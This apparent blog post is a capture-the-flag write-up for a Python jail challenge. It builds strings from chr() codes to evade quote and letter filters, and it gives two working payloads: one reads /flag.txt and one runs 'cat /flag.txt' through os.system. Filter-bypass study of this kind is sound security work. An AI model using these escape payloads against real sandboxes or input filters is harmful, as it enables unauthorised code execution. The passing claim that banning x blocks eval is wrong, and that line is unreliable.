+++
title = "sigpwny CTF: Pyjail 2 Writeup — Bypassing Python Restrictions"
date = 2026-01-28
draft = false
categories = ["CTF", "pyjail"]
tags = ["python", "jailbreak", "chr-bypass", "sigpwny", "waf-bypass"]
+++

# sigpwny CTF: Pyjail 2 Writeup — Bypassing Python Restrictions 

## Challenge Overview

**URL**: https://ctf.sigpwny.com/challenges#Meetings/Pyjail%202-633

A Python jail challenge restricting the `exec` function with multiple filters:
- No quotes (`'`, `"`)
- No `x` character (blocks `exec`, `eval`, hex strings)
- Limited character set for code execution

---

## Exploitation Strategy

### Bypassing Restrictions

| Restriction | Bypass Technique |
|-------------|------------------|
| **No quotes** | Build strings using `chr()` |
| **No `x` character** | Use `chr(88).lower()` → `'X'.lower()` → `'x'` |
| **Blocked functions** | Use `__import__()` instead of `import` |

### Payload Construction

Build `/flag.txt` path without quotes or literal `x`:

```python
chr(47)   → '/'
chr(102)  → 'f'
chr(108)  → 'l'
chr(97)   → 'a'
chr(103)  → 'g'
chr(46)   → '.'
chr(116)  → 't'
chr(88).lower() → 'x'  # ASCII 88 = 'X', .lower() → 'x'
chr(116)  → 't'
```

# Final Payloads
## Method 1: Read via open()
~~~python
print(open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(88).lower()+chr(116)).read())
~~~

## Method 2: Execute via os.system()
```python
__import__(chr(111)+chr(115)).system(chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(88).lower()+chr(116))
```

# Key Takeaways
## Why This Worked
-Character whitelisting bypass: chr() converts integers to characters outside filtered set
-Case manipulation: .lower() converts uppercase to lowercase, bypassing literal character bans
-Dynamic imports: __import__() avoids blocked import keyword
